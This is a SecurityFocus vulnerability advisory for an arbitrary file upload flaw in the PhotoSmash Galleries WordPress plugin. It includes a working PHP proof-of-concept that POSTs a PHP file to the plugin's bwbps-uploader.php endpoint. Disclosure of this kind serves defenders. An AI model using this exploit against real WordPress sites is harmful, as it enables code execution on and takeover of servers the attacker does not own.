source: http://www.securityfocus.com/bid/64173/info

The PhotoSmash Galleries plugin for WordPress is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because it fails to properly validate file extensions before uploading them.

An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application. 

<?php
$uploadfile="file.php";
$ch = curl_init("
http://www.example.com/wordpress/wp-content/plugins/photosmash-galleries/bwbps-uploader.php
");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('FileData'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";
?>